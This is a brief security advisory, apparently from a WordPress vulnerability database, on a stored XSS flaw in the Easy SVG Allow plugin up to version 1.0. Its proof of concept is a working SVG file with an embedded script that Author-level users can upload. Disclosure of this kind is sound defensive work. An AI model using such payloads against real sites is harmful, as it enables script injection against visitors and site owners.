## WordPress Plugin Vulnerabilities

# Easy SVG Allow <= 1.0 - Author+ Stored XSS via SVG

### Description

The plugin does not sanitize uploaded SVG files, which could allow users with a role as low as Author to upload a malicious SVG containing XSS payloads.

### Proof of Concept

Upload an SVG with the following code:
<svg xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">alert("xss");</script>
</svg>
Access the uploaded file directly to trigger the XSS

### Affects Plugins
